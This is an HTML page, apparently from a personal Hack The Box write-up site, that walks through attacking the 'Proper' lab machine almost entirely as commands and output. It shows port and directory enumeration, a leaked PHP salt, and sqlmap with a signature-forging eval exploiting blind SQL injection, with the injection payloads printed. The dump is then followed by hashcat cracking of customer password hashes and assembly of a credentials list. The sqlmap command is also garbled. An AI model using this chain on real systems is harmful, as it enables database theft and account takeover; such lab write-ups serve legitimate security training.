@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    
+        
+
+    
+    <meta property="og:image" content="https://jebidiah-anthony.github.io/banner.jpg" />
+    
+
+    
+
+    <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>jebidiah-anthony</title>
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="jebidiah-anthony" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="https://jebidiah-anthony.github.io/boxes/65_Proper.html" />
+<meta property="og:url" content="https://jebidiah-anthony.github.io/boxes/65_Proper.html" />
+<meta property="og:site_name" content="jebidiah-anthony" />
+<script type="application/ld+json">
+{"@type":"WebPage","headline":"jebidiah-anthony","url":"https://jebidiah-anthony.github.io/boxes/65_Proper.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+ 
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <h1>jebidiah-anthony</h1>
+        <h2>write-ups and what not</h2>
+
+        <h2 style="margin-bottom:0; padding-top:20px">[SITE PAGES]</h2>
+
+<div style="padding-top:10px">
+  
+  > <a href="/">whoami</a>
+  
+</div>
+<div style="padding-top:10px">  
+  >  <a href="/htb.html">
+    
+    <strong style="color:orange">htb writeups</strong>
+    
+  </a>
+</div>
+<div style="padding-top:10px">
+  > <a href="/ctf.html">
+    
+    ctf writeups
+    
+  </a>
+</div>
+<div style="padding-top:10px">
+  > <a href="/projects.html">
+    
+    projects
+    
+  </a>
+</div>
+
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <div class="paragraph">
+<p>$ nmap --min-rate 1000 -oN nmap-tcp.initial -p- -Pn -T4 -v 10.10.10.231</p>
+</div>
+<div class="paragraph">
+<p>PORT   STATE SERVICE
+80/tcp open  http</p>
+</div>
+<div class="paragraph">
+<p>$ sudo nmap -oN nmap-udp -sU -Pn -v 10.10.10.231</p>
+</div>
+<div class="paragraph">
+<p><a href="http://10.10.10.231/licenses/" class="bare">http://10.10.10.231/licenses/</a></p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>&lt;script type="text/javascript"&gt;
+    jQuery('#headerwrap').backstretch([ "assets/img/bg/bg1.jpg", "assets/img/bg/bg3.jpg" ], {duration: 8000, fade: 500});
+    $( "#product-content" ).load("/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b",function() {});
+&lt;/script&gt;</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>$ gobuster dir -o 80_gobuster.txt -u <a href="http://10.10.10.231/" class="bare">http://10.10.10.231/</a> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php</p>
+</div>
+<div class="paragraph">
+<p>$ gobuster dir -o 80_gobuster_php.txt -u <a href="http://10.10.10.231/licenses" class="bare">http://10.10.10.231/licenses</a> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,php</p>
+</div>
+<div class="paragraph">
+<p>$ curl <a href="http://10.10.10.231/products-ajax.php" class="bare">http://10.10.10.231/products-ajax.php</a></p>
+</div>
+<div class="paragraph">
+<p>&lt;!-- [8] Undefined index: order
+On line 6 in file C:\inetpub\wwwroot\products-ajax.php
+  1 |   // SECURE_PARAM_SALT needs to be defined prior including functions.php
+  2 |   define('SECURE_PARAM_SALT','hie0shah6ooNoim');
+  3 |   include('functions.php');
+  4 |   include('db-config.php');
+  5 |   if ( !$_GET['order'] || !$_GET['h'] ) {                &lt;&lt;&lt;&lt;&lt; Error encountered in this line.
+  6 |     // Set the response code to 500
+  7 |     http_response_code(500);
+  8 |     // and die(). Someone fiddled with the parameters.
+  9 |     die('Parameter missing or malformed.');
+ 10 |   }
+ 11 |
+Parameter missing or malformed.</p>
+</div>
+<div class="paragraph">
+<p>$ curl -I <a href="http://10.10.10.231/products-ajax.php" class="bare">http://10.10.10.231/products-ajax.php</a></p>
+</div>
+<div class="paragraph">
+<p>HTTP/1.1 500 Internal Server Error
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+Server: Microsoft-IIS/10.0
+X-Powered-By: PHP/7.4.1
+Date: Wed, 07 Apr 2021 18:05:04 GMT</p>
+</div>
+<div class="paragraph">
+<p>$ sqlmap -u "http://10.10.10.231/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b" --eval="import hashlib;h=hashlib.md5'hie0shah6ooNoim'+order).encode(.hexdigest()"</p>
+</div>
+<div class="paragraph">
+<p>Parameter: order (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: order=(SELECT (CASE WHEN (8581=8581) THEN 'id desc' ELSE (SELECT 2416 UNION SELECT 5558) END))&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>Type: time-based blind
+Title: MySQL &gt;= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
+Payload: order=id desc PROCEDURE ANALYSE(EXTRACTVALUE(9193,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x66637461))))),1)&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>$ sqlmap -u "http://10.10.10.231/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b" --eval="import hashlib;h=hashlib.md5'hie0shah6ooNoim'+order).encode(.hexdigest()" --dump</p>
+</div>
+<div class="paragraph">
+<p>$ cat customers | awk -F "|" '{print $3}' | grep -E "@" | tr -d ' ' &gt; users.txt</p>
+</div>
+<div class="paragraph">
+<p>$ cat customers | awk -F "|" '{print $4}' | grep -E "[0-9a-f]{32}" | tr -d ' ' &gt; hashes</p>
+</div>
+<div class="paragraph">
+<p>$ hashcat --force -m 0 hashes /usr/share/wordlists/rockyou.txt</p>
+</div>
+<div class="paragraph">
+<p>$ hashcat --force --show -m 0 hashes /usr/share/wordlists/rockyou.txt &gt; hashes_cracked</p>
+</div>
+<div class="paragraph">
+<p>$ cat hashes_cracked | cut -d ":" -f 2 &gt; passwords.txt</p>
+</div>
+<div class="paragraph">
+<p>$ ctr=0;for i in $(cat passwords.txt); do x=$ctr=ctr+1; sed -E "$(echo $x)s/(.*)/\1:$i/g" users.txt | grep ":" &gt;&gt; creds.txt; done;</p>
+</div>
+      </section>
+    </div>
+
+    
+      <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'true', 'auto');
+        ga('send', 'pageview');
+      </script>
+    
+  </body>
+</html>
